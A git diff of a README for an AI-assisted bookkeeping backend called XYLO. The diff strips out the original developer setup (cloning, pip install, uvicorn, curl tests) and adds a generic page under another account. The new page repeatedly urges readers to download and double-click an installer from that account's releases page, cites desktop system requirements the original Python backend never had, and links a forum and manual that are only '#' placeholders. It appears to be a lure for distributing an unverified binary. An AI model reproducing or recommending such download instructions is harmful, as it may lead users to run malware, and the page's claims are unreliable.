@@ -1,182 +1,73 @@
-# XYLO – AI-Powered Business Automation System  
-### Intelligent finance automation · OCR · Accounting engine · FastAPI backend
+# 🚀 Xylo-business-automation-suite - Simplify Your Business Processes Effortlessly
 
-XYLO is an AI-assisted backend automation system built to simplify bookkeeping, invoices, reporting, reminders, and financial insights for small businesses.  
-It is designed with a clean modular FastAPI backend and structured like a lightweight ERP system.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/jordiacn/Xylo-business-automation-suite/releases)
 
----
+## 📖 Overview
 
-## ⭐ Key Features
+XYLO is an AI-powered business automation suite. It helps you generate books of accounts, provides intelligent customer support, and automates your daily business operations. With its user-friendly design, anyone can utilize its features effectively. 
 
-### 📄 Invoice OCR
-- Upload invoices (PDF/image)  
-- Extract vendor, date, amount  
-- Auto-create transactions  
-- Auto-post journal entries  
+## 🚀 Getting Started
 
-### 💬 AI Chat Assistant
-Ask natural questions like:
-- “Show my expenses this month”  
-- “Generate my daily summary”  
-- “Has invoice #102 been paid?”
+To get started with Xylo, follow these steps:
 
-(ML-powered assistant planned)
+1. **Visit the Releases Page**: Go to [this link](https://github.com/jordiacn/Xylo-business-automation-suite/releases) to access the downloads for Xylo.
+   
+2. **Download the Application**: Look for the latest release, usually at the top of the page. Click the link that represents your operating system to download the software.
 
-### 📊 Financial Report Generator
-Generates:
-- Trial Balance  
-- Profit & Loss  
-- Balance Sheet  
-- Daily Summary  
+3. **Install Xylo**: Once the download is complete, locate the file on your computer. Double-click the file to begin the installation process. Follow the prompts to install the application.
 
-Formats supported: **PDF, CSV, JSON**
+4. **Run Xylo**: After the installation completes, find Xylo in your applications or programs list. Click on it to open the software.
 
-### ⚙ Automation Scheduler
-- Daily summary reports  
-- Weekly database backup  
-- Overdue payment reminders  
-- Interval-based tasks  
+## 💡 Features
 
-### 📘 Accounting Engine
-- Double-entry bookkeeping  
-- Ledger system  
-- Chart of accounts  
-- Journal entries  
-- Reconciliation checks  
+- **Intelligent Bookkeeping**: Automatically generate and manage accounts for your business.
+- **Customer Support Chatbot**: Engage with your clients through AI-driven conversations.
+- **Automation Scripts**: Use automated processes to streamline your daily operations.
+- **Modular Components**: Customize features according to your business needs.
 
-### 🚀 FastAPI Backend
-- Modular routes  
-- Adapter-based architecture  
-- Clean utilities for PDF/OCR  
-- Swagger API documentation  
+## 📦 Download & Install
 
----
+Ready to download? Follow the steps below:
 
-## 🧩 System Architecture
+1. **Go to the Releases**: Click [here](https://github.com/jordiacn/Xylo-business-automation-suite/releases) to visit the releases page.
+   
+2. **Choose Your File**: Look for the latest version suitable for your operating system. Click the download link to get the application file.
 
-```
-XYLO/
-│
-├── backend/
-│   ├── api/                 # FastAPI routes & controllers
-│   ├── accounting_engine/   # Journals, ledgers, validation
-│   ├── automation/          # Scheduler, reminders, invoice pipeline
-│   ├── utils/               # PDF generator, CSV tools, helpers
-│   └── database/            # SQLite models (future ORM)
-│
-├── docs/                    # Architecture + development docs
-├── samples/                 # Demo invoices + generated reports
-└── frontend/                # Future dashboard UI
-```
+3. **Installation Process**: Once downloaded, open the file. Follow the simple on-screen instructions to install Xylo. 
 
----
+4. **Open and Use**: After installation, find Xylo in your list of applications. Launch it and start automating your business processes.
 
-## 📦 Installation
+## 🖥️ System Requirements
 
-### 1. Clone
-```bash
-git clone https://github.com/Shashwat-Aneja/xylo
-cd xylo
-```
+To run Xylo, your system should meet the following minimum specifications:
 
-### 2. Create a Virtual Environment
-**Windows**
-```bash
-python -m venv venv
-venv\Scripts\activate
-```
+- **Operating System**: Windows 10 or higher / macOS 10.12 or higher / Linux (Ubuntu 18.04 and above).
+- **Processor**: Intel i3 or equivalent.
+- **RAM**: Minimum of 4 GB.
+- **Storage**: At least 500 MB of free space.
 
-**Mac/Linux**
-```bash
-python3 -m venv venv
-source venv/bin/activate
-```
+Ensure your system meets these requirements to successfully run the application.
 
-### 3. Install Dependencies
-```bash
-pip install fastapi uvicorn reportlab python-dotenv
-```
+## 🌐 Support
 
-**Optional OCR support**
-```bash
-pip install pytesseract pillow
-```
+If you have questions or encounter issues, we offer several support options:
 
----
+- **Documentation**: Check online documentation available on our GitHub Wiki for guides and tips.
+- **Community Forum**: Join our community forum to ask questions and share experiences with other users.
+- **Contact Us**: For direct support, you can reach out through our contact page on GitHub.
 
-## ▶️ Running the Server
-```bash
-uvicorn backend.api.main:app --reload
-```
+## 📖 User Manual
 
-Open API docs:  
-http://127.0.0.1:8000/docs
+Once you have installed Xylo, make sure to go through the user manual provided in the application. It will help you understand all features and how to use them effectively.
 
----
+## 🔗 Helpful Resources
 
-## 🧪 Testing Core Features
+- [Xylo GitHub Repository](https://github.com/jordiacn/Xylo-business-automation-suite)
+- [Join our Community Forum](#)
+- [User Manual PDF](#)
 
-### 1. Add Transaction
-```bash
-curl -X POST http://127.0.0.1:8000/accounting/add_transaction \
--H "Content-Type: application/json" \
--d "{\"date\":\"2025-01-01T00:00:00\",\"amount\":1200,\"description\":\"Test Sale\"}"
-```
+## 🧩 Future Updates
 
-### 2. Generate Trial Balance  
-```
-GET /accounting/trial_balance
-```
+We regularly update Xylo with new features and improvements. Check back frequently on our Releases page for the latest updates.
 
-### 3. Upload Invoice  
-```
-POST /invoices/upload
-```
-
-### 4. AI Chat Assistant  
-```
-POST /chatbot/message
-```
-
----
-
-## 📊 Example Trial Balance Output
-```json
-{
-  "assets": 1200,
-  "liabilities": 0,
-  "equity": 0,
-  "difference": 1200
-}
-```
-
----
-
-## ⚙ Automation Scheduler
-Run automation tasks:
-
-```bash
-python backend/automation/scheduler.py
-```
-
-Tasks executed:
-- Daily 10 PM summary  
-- Weekly backup  
-- Overdue reminders  
-
----
-
-## 📘 Documentation
-- `/docs/architecture/` — System diagrams  
-- `/docs/dev_setup.md` — Development setup  
-- `/docs/frontend/` — Dashboard planning  
-- `/docs/automation/` — Task workflows  
-
----
-
-## 🎯 Project Goals
-- Real-world financial automation  
-- Add ML-based assistant  
-- Improve OCR accuracy  
-- Build a full dashboard UI  
-- Deploy a public demo
+Thank you for choosing Xylo to enhance your business management. We hope it simplifies your processes and helps you succeed!
